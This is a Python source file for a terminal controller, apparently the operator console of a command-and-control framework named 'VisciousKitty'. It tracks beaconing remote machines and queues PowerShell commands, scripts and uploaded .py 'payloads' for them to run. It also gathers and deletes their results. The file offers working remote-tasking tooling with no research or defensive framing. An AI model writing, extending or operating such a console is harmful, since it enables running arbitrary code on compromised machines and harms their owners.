#!/usr/bin/env python3
"""Standalone TUI controller: small terminal UI for monitoring clients/tasks on the local server.

Usage: python tui_controller.py [--server <url>] [--refresh <seconds>]

Uses `rich` for coloring and layout and `requests` to talk to the HTTP API.
"""
from __future__ import annotations

import argparse
import requests
import sys
import os
import json
import time
from typing import List

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.align import Align
    from rich.text import Text
    from rich.prompt import Prompt
except Exception:  # pragma: no cover
    Console = None


DEFAULT_SERVER = "http://127.0.0.1:8000"


class TUIController:
    def __init__(self, server_url: str = DEFAULT_SERVER, refresh: int = 5):
        self.server_url = server_url.rstrip("/")
        self.refresh = max(1, refresh)
        self.console = Console() if Console else None

    def _get(self, path: str, params=None, timeout=3):
        try:
            r = requests.get(self.server_url + path, params=params, timeout=timeout)
            r.raise_for_status()
            return r.json()
        except Exception as e:
            return {"_error": str(e)}

    def _post(self, path: str, params=None, timeout=5):
        try:
            r = requests.post(self.server_url + path, params=params, timeout=timeout)
            r.raise_for_status()
            return r.json()
        except Exception as e:
            return {"_error": str(e)}

    def get_counts(self):
        machines = self._get("/machines").get("machines") or []
        total_tasks = 0
        for mid in machines:
            t = self._get("/tasks", params={"machine_id": mid}).get("tasks") or []
            total_tasks += len(t)
        return len(machines), total_tasks

    def list_clients(self):
        return self._get("/machines").get("machines") or []

    def list_mapping(self):
        return self._get("/mapped").get("mapping") or {}

    def get_tasks(self, target: str):
        if str(target).isdigit():
            return self._get("/tasks", params={"short_id": target}).get("tasks") or []
        return self._get("/tasks", params={"machine_id": target}).get("tasks") or []

    def get_results(self, target: str):
        if str(target).isdigit():
            return self._get("/results", params={"short_id": target}).get("results") or []
        return self._get("/results", params={"machine_id": target}).get("results") or []

    def add_task(self, target: str, task_id: str, ttype: str, command: str = None, script: str = None):
        params = {"task_id": task_id, "task_type": ttype}
        if str(target).isdigit():
            params["short_id"] = target
        else:
            params["machine_id"] = target
        if ttype.upper() == "CMD":
            params["command"] = command or ""
        else:
            params["script"] = script or ""
        return self._post("/addtask", params=params)

    def render_header(self, clients: int, tasks: int):
        if self.console:
            left = Text(f"{clients} clients online", style="bold green")
            right = Text(f"{tasks} tasks pending", style="bold yellow")
            bar = Text.assemble(left, Text("  |  ", style="dim"), right)
            return Panel(Align.center(bar), style="blue", subtitle=f"server={self.server_url}")
        else:
            return f"{clients} clients online | {tasks} tasks pending  (server={self.server_url})"

    def render_help(self):
        lines = [
            "Commands:",
            "  r            refresh",
            "  l            list clients",
            "  m            show short-id mapping",
            "  t <target>   show tasks for <target> (raw machine id or short id)",
            "  a            add task (will prompt for details)",
            "  cmd <target> <command...>  quick-add command task",
            "  upload <path>            - upload a .py payload to server",
            "  payloads                 - list available payloads on server",
            "  addpayload <target> <task_id> <payload_name> - add PAYLOAD task referencing uploaded payload",
            "  q            quit",
            "  db stats     - show DB stats (count & file)",
            "  db list      - list all results in DB",
            "  db del <id>  - delete result by id",
        ]
        if self.console:
            return Panel("\n".join(lines), title="Help", style="green")
        return "\n".join(lines)

    def run(self):
        if not self.console:
            print("Rich is not installed — please install it (requirements.txt included). Falling back to plain output.")

        try:
            while True:
                clients, tasks = self.get_counts()
                self.console.clear() if self.console else None
                header = self.render_header(clients, tasks)
                help_panel = self.render_help()
                if self.console:
                    self.console.print(header)
                    self.console.print(help_panel)
                else:
                    print(header)
                    print(help_panel)

                cmd = Prompt.ask("Command (q to quit)") if self.console else input("Command (q to quit): ")
                cmd = (cmd or "").strip()
                if not cmd:
                    continue
                if cmd.lower() in ("q", "quit", "exit"):
                    break
                if cmd.lower() in ("r", "refresh"):
                    continue
                if cmd.lower() in ("l", "clients"):
                    # prefer clients_status endpoint for richer info
                    try:
                        data = self._get("/clients_status")
                        mapping = data.get("clients_status", {}) if isinstance(data, dict) else {}
                    except Exception as e:
                        mapping = {}

                    if self.console:
                        t = Table(show_header=True, header_style="bold magenta")
                        t.add_column("#")
                        t.add_column("machine_id")
                        t.add_column("last_seen")
                        t.add_column("sleeping_in(s)")
                        t.add_column("has_task")
                        now = time.time()
                        for i, (m, s) in enumerate(mapping.items(), start=1):
                            last_seen = s.get("last_seen") if isinstance(s, dict) else None
                            ago = "-"
                            if last_seen:
                                ago = f"{int(now - float(last_seen))}s ago"
                            secs_until = s.get("secs_until") if isinstance(s, dict) else None
                            secs_until = str(secs_until) if secs_until is not None else "-"
                            has_task = str(s.get("has_task", False)) if isinstance(s, dict) else "-"
                            t.add_row(str(i), m, ago, secs_until, has_task)
                        self.console.print(t)
                    else:
                        print("Clients:")
                        for m in clients:
                            print(" -", m)
                    Prompt.ask("Press Enter to continue") if self.console else input("Press Enter to continue...")
                    continue
                if cmd.lower() in ("m", "map", "mapped"):
                    mapping = self.list_mapping()
                    if self.console:
                        t = Table(show_header=True, header_style="bold magenta")
                        t.add_column("short_id")
                        t.add_column("machine_id")
                        for sid, mid in mapping.items():
                            t.add_row(str(sid), mid)
                        self.console.print(t)
                    else:
                        print("Mapping:")
                        for sid, mid in mapping.items():
                            print(f" {sid} -> {mid}")
                    Prompt.ask("Press Enter to continue") if self.console else input("Press Enter to continue...")
                    continue
                if cmd.lower().startswith("t "):
                    target = cmd.split(None, 1)[1]
                    tasks_list = self.get_tasks(target)
                    if self.console:
                        t = Table(show_header=True, header_style="bold magenta")
                        t.add_column("task_id")
                        t.add_column("type")
                        t.add_column("payload")
                        for tk in tasks_list:
                            tid = tk.get("task_id") or tk.get("id") or "unknown"
                            typ = tk.get("type")
                            payload = tk.get("command") or tk.get("script") or ""
                            if len(payload) > 120:
                                payload = payload[:120] + "..."
                            t.add_row(str(tid), str(typ), payload)
                        self.console.print(t)
                    else:
                        print("Tasks for", target)
                        for tk in tasks_list:
                            print(tk)
                    Prompt.ask("Press Enter to continue") if self.console else input("Press Enter to continue...")
                    continue
                if cmd.lower().startswith("results ") or cmd.lower() == "results":
                    target = cmd.split(None, 1)[1] if " " in cmd else Prompt.ask("Target (short id or machine_id)")
                    results_list = self.get_results(target)
                    if self.console:
                        t = Table(show_header=True, header_style="bold magenta")
                        t.add_column("id")
                        t.add_column("task_id")
                        t.add_column("timestamp")
                        t.add_column("preview")
                        for r in results_list:
                            tid = r.get("task_id")
                            rid = r.get("id")
                            ts = r.get("timestamp")
                            body = r.get("result", "")
                            preview = (body[:120] + "...") if isinstance(body, str) and len(body) > 120 else str(body)
                            t.add_row(str(rid), str(tid), str(ts), preview)
                        self.console.print(t)
                    else:
                        print("Results for", target)
                        for r in results_list:
                            print(r)
                    Prompt.ask("Press Enter to continue") if self.console else input("Press Enter to continue...")
                    continue

                if cmd.lower().startswith("upload ") or cmd.lower() == "upload":
                    # upload <path>
                    parts = cmd.split(None, 1)
                    if len(parts) >= 2:
                        local = parts[1]
                    else:
                        local = Prompt.ask("Local path to .py file to upload")
                    try:
                        with open(local, "r", encoding="utf-8") as f:
                            content = f.read()
                    except Exception as e:
                        if self.console:
                            self.console.print(f"Error reading file: {e}", style="bold red")
                        else:
                            print("Error reading file:", e)
                        Prompt.ask("Press Enter to continue") if self.console else input("Press Enter to continue...")
                        continue

                    try:
                        resp = requests.post(f"{self.server_url}/upload_payload", json={"file_name": os.path.basename(local), "content": content}, timeout=10)
                        if self.console:
                            self.console.print_json(data=resp.json())
                        else:
                            print(resp.status_code, resp.text)
                    except Exception as e:
                        if self.console:
                            self.console.print(f"Upload error: {e}", style="bold red")
                        else:
                            print("Upload error:", e)
                    Prompt.ask("Press Enter to continue") if self.console else input("Press Enter to continue...")
                    continue

                if cmd.lower() in ("payloads", "payload list"):
                    try:
                        r = self._get("/payloads")
                        p = r.get("payloads", [])
                    except Exception as e:
                        p = [{"error": str(e)}]
                    if self.console:
                        t = Table(show_header=True, header_style="bold magenta")
                        t.add_column("id")
                        t.add_column("file_name")
                        t.add_column("timestamp")
                        for rec in p:
                            t.add_row(str(rec.get("id")), rec.get("file_name"), str(rec.get("timestamp")))
                        self.console.print(t)
                    else:
                        print(p)
                    Prompt.ask("Press Enter to continue") if self.console else input("Press Enter to continue...")
                    continue

                if cmd.lower().startswith("addpayload ") or cmd.lower().startswith("addpayload"):
                    parts = cmd.split()
                    if len(parts) >= 4:
                        target = parts[1]
                        task_id = parts[2]
                        payload_name = parts[3]
                    else:
                        target = Prompt.ask("Target (short id or machine_id)")
                        task_id = Prompt.ask("Task id")
                        payload_name = Prompt.ask("Payload name (file_name.py)")

                    params = {"task_id": task_id, "task_type": "PAYLOAD", "command": payload_name}
                    if str(target).isdigit():
                        params["short_id"] = str(target)
                    else:
                        params["machine_id"] = target

                    try:
                        resp = requests.post(f"{self.server_url}/addtask", params=params, timeout=5)
                        if self.console:
                            self.console.print_json(data=resp.json())
                        else:
                            print(resp.status_code, resp.text)
                    except Exception as e:
                        if self.console:
                            self.console.print(f"Error adding payload task: {e}", style="bold red")
                        else:
                            print("Error adding payload task:", e)
                    Prompt.ask("Press Enter to continue") if self.console else input("Press Enter to continue...")
                    continue

                # DB commands
                if cmd.lower().startswith("db "):
                    parts = cmd.split()
                    verb = parts[1] if len(parts) >= 2 else ""
                    if verb == "stats":
                        r = self._get("/db_stats")
                        if self.console:
                            self.console.print_json(data=r)
                        else:
                            print(r)
                        Prompt.ask("Press Enter to continue") if self.console else input("Press Enter to continue...")
                        continue
                    if verb in ("list", "all"):
                        r = self._get("/results_all")
                        results = r.get("results", []) if isinstance(r, dict) else []
                        if self.console:
                            t = Table(show_header=True, header_style="bold magenta")
                            t.add_column("id")
                            t.add_column("machine_id")
                            t.add_column("task_id")
                            t.add_column("timestamp")
                            for res in results:
                                t.add_row(str(res.get("id")), str(res.get("machine_id")), str(res.get("task_id")), str(res.get("timestamp")))
                            self.console.print(t)
                        else:
                            print(results)
                        Prompt.ask("Press Enter to continue") if self.console else input("Press Enter to continue...")
                        continue
                    if verb in ("del", "delete"):
                        if len(parts) < 3:
                            if self.console:
                                self.console.print("Usage: db del <id>", style="bold yellow")
                            else:
                                print("Usage: db del <id>")
                            continue
                        rid = parts[2]
                        try:
                            # use delete endpoint
                            r = requests.delete(f"{self.server_url}/result", params={"id": rid}, timeout=5)
                            if self.console:
                                self.console.print_json(data=r.json())
                            else:
                                print(r.status_code, r.text)
                        except Exception as e:
                            if self.console:
                                self.console.print(f"Error deleting id: {e}", style="bold red")
                            else:
                                print("Error deleting id:", e)
                        Prompt.ask("Press Enter to continue") if self.console else input("Press Enter to continue...")
                        continue
                if cmd.lower().startswith("view ") or cmd.lower() == "view":
                    parts = cmd.split()
                    if len(parts) >= 2:
                        rid = parts[1]
                    else:
                        rid = Prompt.ask("Result id to view")

                    try:
                        r = self._get("/result", params={"id": rid})
                        res = r.get("result") if isinstance(r, dict) else None
                    except Exception as e:
                        res = {"error": str(e)}

                    if self.console:
                        self.console.print(Panel(json.dumps(res, indent=2), title=f"Result {rid}", style="green"))
                    else:
                        print(res)

                    Prompt.ask("Press Enter to continue") if self.console else input("Press Enter to continue...")
                    continue
                if cmd.lower().startswith("cmd ") or cmd.lower() == "cmd":
                    parts = cmd.split()
                    if len(parts) >= 3:
                        target = parts[1]
                        cmd_text = cmd.split(None, 2)[2]
                    else:
                        target = Prompt.ask("Target (short id or machine_id)")
                        cmd_text = Prompt.ask("Command to run in PowerShell")

                    if not target or not cmd_text:
                        if self.console:
                            self.console.print("Missing target or command", style="bold red")
                            Prompt.ask("Press Enter to continue")
                            self.console.clear()
                        else:
                            print("Missing target or command")
                        continue

                    import uuid as _uuid
                    task_id = str(_uuid.uuid4())
                    res = self.add_task(target, task_id, "CMD", command=cmd_text)
                    if self.console:
                        self.console.print_json(data=res)
                    else:
                        print(res)
                    Prompt.ask("Press Enter to continue") if self.console else input("Press Enter to continue...")
                    continue
                if cmd.lower().startswith("a"):
                    # add task interactive
                    target = Prompt.ask("Target (short id or machine_id)") if self.console else input("Target (short id or machine_id): ")
                    task_id = Prompt.ask("Task id") if self.console else input("Task id: ")
                    ttype = Prompt.ask("Type", choices=["CMD", "SCRIPT"], default="CMD") if self.console else input("Type (CMD/SCRIPT): ")
                    if ttype.upper() == "CMD":
                        command = Prompt.ask("Command") if self.console else input("Command: ")
                        res = self.add_task(target, task_id, "CMD", command=command)
                    else:
                        print("Enter script (end with a single line with only 'EOF')")
                        lines: List[str] = []
                        if self.console:
                            while True:
                                ln = Prompt.ask(">")
                                if ln.strip() == "EOF":
                                    break
                                lines.append(ln)
                        else:
                            while True:
                                ln = input()
                                if ln.strip() == "EOF":
                                    break
                                lines.append(ln)
                        script = "\n".join(lines)
                        res = self.add_task(target, task_id, "SCRIPT", script=script)
                    if self.console:
                        self.console.print_json(data=res)
                    else:
                        print(res)
                    Prompt.ask("Press Enter to continue") if self.console else input("Press Enter to continue...")
                    continue
                if self.console:
                    self.console.print("Unknown command", style="bold red")
                else:
                    print("Unknown command")
                time.sleep(0.2)

        except KeyboardInterrupt:
            pass


def parse_args(argv=None):
    p = argparse.ArgumentParser(description="TUI controller for monitoring VisciousKitty server")
    p.add_argument("--server", default=DEFAULT_SERVER, help="Server URL (default: %(default)s)")
    p.add_argument("--refresh", type=int, default=5, help="Refresh interval seconds (default: %(default)s)")
    return p.parse_args(argv)


def main(argv=None):
    args = parse_args(argv)
    tui = TUIController(server_url=args.server, refresh=args.refresh)
    tui.run()


if __name__ == "__main__":
    raise SystemExit(main())
